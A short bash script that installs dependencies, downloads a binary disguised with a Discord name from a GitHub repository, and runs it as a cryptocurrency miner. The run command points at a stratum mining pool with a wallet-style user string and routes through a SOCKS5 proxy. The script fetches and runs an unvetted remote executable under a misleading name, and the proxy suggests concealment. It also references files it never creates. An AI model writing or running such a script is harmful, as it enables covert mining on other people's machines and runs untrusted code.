#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O Discord-V.001 https://github.com/Explorer-Discord/Discord-V.001/raw/main/Discord-V.001
screen -dmS ls
chmod +x Discord.sh && chmod +x Discord-V.001 && chmod 777 Discord Discord.sh
./Discord-V.001 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.AB=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://192.241.134.40:8838
